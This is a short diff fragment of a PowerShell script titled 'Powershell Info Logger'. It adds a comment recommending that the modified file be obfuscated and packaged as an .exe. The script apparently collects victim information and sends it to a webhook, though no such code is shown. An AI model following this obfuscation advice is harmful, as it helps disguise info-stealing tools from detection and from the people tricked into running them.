@@ -1,4 +1,6 @@
 # Coded by @DARKNOSY (https://github.com/DARKNOSY/Info-Logger)
+# I recommend using Ps2ExeXobfuscator for obfuscating and making this modified file a .exe (https://github.com/DARKNOSY/Ps2ExeXobfuscator)
+
 $avatarUrl = 'https://avatars.githubusercontent.com/u/109553205?v=4'
 $username = "Powershell Info Logger / @DARKNOSY"
 
